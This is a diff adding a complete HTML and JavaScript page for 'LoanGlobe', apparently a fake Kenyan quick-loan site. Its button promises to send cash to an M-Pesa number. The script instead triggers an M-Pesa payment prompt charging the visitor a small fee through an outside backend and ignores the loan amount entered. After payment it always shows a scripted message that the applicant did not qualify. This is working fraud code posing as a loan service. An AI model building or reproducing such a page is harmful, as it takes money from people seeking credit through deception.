@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LoanGlobe - Quick Loan Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #27ae60;
+            --primary-dark: #219653;
+            --dark: #2c3e50;
+            --light: #ecf0f1;
+            --spacing: 1.6rem;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 1rem;
+            line-height: 1.5;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+            padding: 1.2rem 0;
+            background: rgba(0,0,0,0.35);
+            border-radius: 12px 12px 0 0;
+            margin-bottom: 1.5rem;
+        }
+
+        header img.logo {
+            height: 50px;
+            width: auto;
+            border-radius: 50%;
+            object-fit: contain;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+        }
+
+        header h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 540px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.11);
+            backdrop-filter: blur(8px);
+            padding: var(--spacing);
+            border-radius: 16px;
+            box-shadow: 0 12px 35px rgba(0,0,0,0.4);
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 1.8rem;
+            color: #f1f1f1;
+            font-weight: 600;
+            font-size: 1.45rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            font-size: 0.95rem;
+            color: #e0e0e0;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 0.95rem 1rem;
+            margin-bottom: 1.4rem;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: rgba(255,255,255,0.92);
+            color: #222;
+            transition: all 0.2s;
+        }
+
+        input:focus, select:focus {
+            outline: 2px solid var(--primary);
+            background: white;
+        }
+
+        button {
+            width: 100%;
+            padding: 1.15rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+            margin: 1.6rem 0;
+            touch-action: manipulation;
+        }
+
+        button:hover:not(:disabled) {
+            background: #2ecc71;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(39,174,96,0.4);
+        }
+
+        button:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+        }
+
+        .image-section {
+            text-align: center;
+            margin: 1.8rem 0;
+        }
+
+        .image-section img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            display: block;
+            margin: 0 auto;
+        }
+
+        #status {
+            margin-top: 1rem;
+            padding: 1.1rem;
+            border-radius: 10px;
+            background: rgba(0,0,0,0.45);
+            min-height: 70px;
+            font-size: 0.94rem;
+            line-height: 1.45;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.35);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        footer {
+            text-align: center;
+            margin-top: 2.8rem;
+            font-size: 0.85rem;
+            opacity: 0.75;
+            padding-bottom: 1.5rem;
+        }
+
+        /* ────────────────────────────────────────
+           MOBILE RESPONSIVE ADJUSTMENTS
+        ──────────────────────────────────────── */
+        @media (max-width: 600px) {
+            body {
+                padding: 0.8rem;
+            }
+
+            header {
+                flex-direction: column;
+                gap: 0.6rem;
+                padding: 1rem 0;
+            }
+
+            header img.logo {
+                height: 45px;
+            }
+
+            header h1 {
+                font-size: 1.6rem;
+            }
+
+            .container {
+                padding: 1.4rem;
+                border-radius: 12px;
+            }
+
+            h2 {
+                font-size: 1.3rem;
+                margin-bottom: 1.5rem;
+            }
+
+            input, select, button {
+                font-size: 1rem;
+                padding: 0.9rem 1rem;
+            }
+
+            button {
+                padding: 1.1rem;
+                font-size: 1.05rem;
+            }
+
+            .image-section {
+                margin: 1.4rem 0;
+            }
+
+            #status {
+                font-size: 0.92rem;
+                padding: 1rem;
+            }
+        }
+
+        @media (max-width: 380px) {
+            header h1 {
+                font-size: 1.45rem;
+            }
+
+            .container {
+                padding: 1.2rem;
+            }
+
+            button {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="images/logo.png" alt="LoanGlobe Logo" class="logo">
+        <h1>LoanGlobe</h1>
+    </header>
+
+    <div class="container">
+        <h2>Apply for Your Loan Now</h2>
+
+        <form id="loanForm">
+            <label for="name">Full Name</label>
+            <input type="text" id="name" placeholder="John Mwangi" required>
+
+            <label for="phone">M-Pesa Phone Number</label>
+            <input type="tel" id="phone" placeholder="254712345678" required pattern="254[17]\d{8}">
+
+            <label for="country">Country</label>
+            <select id="country" required>
+                <option value="" disabled selected>Select your country</option>
+                <option value="Kenya">Kenya</option>
+                
+            </select>
+
+            <label for="amount">How much do you need? (KES)</label>
+            <input type="number" id="amount" placeholder="e.g. 5000" min="1000" required>
+        </form>
+
+        <div class="image-section">
+            <img src="cont.png" alt="Happy clients / Loan success" />
+        </div>
+
+        <button type="submit" form="loanForm" id="submitBtn">
+                Withdraw cash to your Mpesa number now! –
+        </button>
+
+        <div id="status"></div>
+    </div>
+
+    <footer>
+        © 2025 LoanGlobe • All rights reserved
+    </footer>
+
+    <script>
+        const BACKEND_URL = "https://newpayment-srpu.onrender.com";
+
+        const form = document.getElementById('loanForm');
+        const statusDiv = document.getElementById('status');
+        const submitBtn = document.getElementById('submitBtn');
+
+        submitBtn.addEventListener('click', async (e) => {
+            e.preventDefault();
+
+            const name    = document.getElementById('name').value.trim();
+            const phone   = document.getElementById('phone').value.trim();
+            const country = document.getElementById('country').value;
+            const amount  = document.getElementById('amount').value;
+
+            if (!phone.match(/^254[17]\d{8}$/)) {
+                alert("Please enter a valid phone number starting with 2547 or 2541");
+                return;
+            }
+
+            if (!name || !country || !amount) {
+                alert("Please complete all fields");
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loader"></span> Processing...';
+            statusDiv.innerHTML = "Sending payment prompt to your phone...";
+
+            try {
+                const payRes = await fetch(`${BACKEND_URL}/api/initiate`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        amount: 5,
+                        phone_number: phone
+                    })
+                });
+
+                const payData = await payRes.json();
+
+                if (!payRes.ok || !payData?.invoice?.invoice_id) {
+                    throw new Error(payData.error || "Could not send payment request");
+                }
+
+                const invoiceId = payData.invoice.invoice_id;
+
+                statusDiv.innerHTML = `
+                    <strong>STK Push sent to ${phone}</strong><br>
+                    Please enter your M-Pesa PIN on your phone.<br>
+                    <small>Do NOT refresh or close this page</small>
+                `;
+
+                startPolling(invoiceId, { name, phone, country, requestedAmount: amount });
+
+            } catch (err) {
+                statusDiv.style.color = "#ff6b6b";
+                statusDiv.innerHTML = `Error: ${err.message}`;
+                resetButton();
+            }
+        });
+
+        function startPolling(invoiceId, userData) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
+                    const data = await res.json();
+
+                    const state = data.invoice?.state || data.state || "PENDING";
+
+                    if (state === "COMPLETE" || state === "COMPLETED") {
+                        clearInterval(interval);
+
+                        statusDiv.style.color = "#2ecc71";
+                        statusDiv.innerHTML = `
+                            <strong>✅ </strong><br>
+                            Your loan application has been submitted.<br>
+                            We will contact you soon.
+                        `;
+
+                        setTimeout(() => {
+                            alert("Dear client we regret to tell you have not qualified for the loan , please apply again.Thank you.");
+                        }, 2800);
+
+                    } else if (["FAILED", "REJECTED", "CANCELLED"].includes(state)) {
+                        clearInterval(interval);
+                        statusDiv.style.color = "#ff6b6b";
+                        statusDiv.innerHTML = "❌ Cancelled loan apllication.";
+                        resetButton();
+                    }
+
+                } catch (err) {
+                    console.error("Polling error:", err);
+                }
+            }, 3500);
+        }
+
+        function resetButton() {
+            submitBtn.disabled = false;
+            submitBtn.textContent = "   Withdraw cash to your Mpesa number now! – ";
+        }
+    </script>
+</body>
+</html>
